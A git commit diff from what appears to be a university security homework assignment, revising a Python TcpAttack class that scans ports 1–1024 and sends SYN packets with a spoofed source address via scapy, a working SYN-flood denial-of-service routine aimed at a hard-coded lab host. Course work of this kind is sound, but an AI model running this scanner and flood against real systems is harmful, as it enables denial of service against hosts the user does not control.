794925e314586b898fb99bd393bde7136d5f9486
terrence <terrencetjr24@gmail.com>
2020-03-24 22:27:04 -0400

    done with homework 8

--- hmwk8/TcpAttack.py
+++ hmwk8/TcpAttack.py
@@ -31,53 +31,52 @@ class TcpAttack:
                 sock.connect((self.targetIP, testport))
                 open_ports.append(testport)
                 if display:
-                    print(f"port open: {testport}")
+                    print("port open: ", testport)
             except:
                 if display:
-                    print(f"port closed: {testport}")
-
+                    print("port closed: ", testport)
         FILEOUT = open('openports.txt', 'w')
         for x in open_ports:
             FILEOUT.write(str(x) + '\n')
         FILEOUT.close()
-
     # port: Integer designating the port that the attack will use
     # numSyn: Integer of SYN packets to send to target IP address at the given port
     # If the port is open, perform DoS attack and return 1. Otherwise return 0.
     def attackTarget(self, port, numSyn):
         FILEIN = open('openports.txt', 'r')
-        for x in FILEIN:
-            if int(x) == port:
-                for i in range(numSyn):
-                    IP_header = scapy.all.IP(src=self.spoofIP, dst=self.targetIP)
-                    TCP_header = scapy.all.TCP(flags="S", sport=RandShort(), dport=int(x))
-                    packet = IP_header / TCP_header
-                    try:
-                        send(packet)
-                        print("Successfuly sent packet")
-                    except Exception as error:
-                        print(f"Error on iteration: {i}")
-                        print(error)
-                return 1
-        return 0
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(0.1)
+        try:
+            sock.connect((self.targetIP, port))
+            for i in range(numSyn):
+                IP_header = scapy.all.IP(src=self.spoofIP, dst=self.targetIP)
+                TCP_header = scapy.all.TCP(flags="S", sport=RandShort(), dport=int(port))
+                packet = IP_header / TCP_header
+                try:
+                    send(packet)
+                    #print("Successfuly sent packet")
+                except Exception as error:
+                    #print(f"Error on iteration: {i}")
+                    print(error)
+            return 1
+        except Exception as err:
+            print("failed to attack, given error:")
+            print(err)
+            return 0
 
 if __name__ == '__main__':
-    #if len(sys.argv) == 1:
-    spoofIP = '68.50.234.107'; targetIP ='68.50.234.107'  # Will contain actual IP addresses in real script
-    rangeStart = int(1) ;    rangeEnd = int(1024);    port = int(80)
+    spoofIP = '65.50.234.105' # this is not my actual ip address (a "fake" ip address)
+    targetIP = '128.46.4.61' #my shay computer's public ip address
+    #checking ports 1 through 1024 (inclusive)
+    rangeStart = int(1)
+    rangeEnd = int(1024)
+    port = int(22)
     Tcp = TcpAttack(spoofIP, targetIP)
     #Tcp.scanTarget(rangeStart, rangeEnd)
-    if Tcp.attackTarget(port, 3):
+    if Tcp.attackTarget(port, 10):
         print('port was open to attack')
+
     '''
-    elif len(sys.argv) != 6:
-        print("Proper Usage: python3 TcpAttack.py <spoofIP> <targetIP> <rangeStart> <rangeEnd> <port>")
-    else:
-        print("Running from user inputs")
-        spoofIP = int(sys.argv[1]); targetIP = int(sys.argv[2])  # Will contain actual IP addresses in real script
-        rangeStart = int(sys.argv[3]); rangeEnd = int(sys.argv[4]); port = int(sys.argv[5])
-        Tcp = TcpAttack(spoofIP, targetIP)
-        Tcp.scanTarget(rangeStart, rangeEnd)
-        if Tcp.attackTarget(port, 10):
-            print('port was open to attack')
+    TCP dump command to run to see the scanning and "attacking" occuring:
+    sudo tcpdump | grep shay.ecn.purdue.edu
     '''
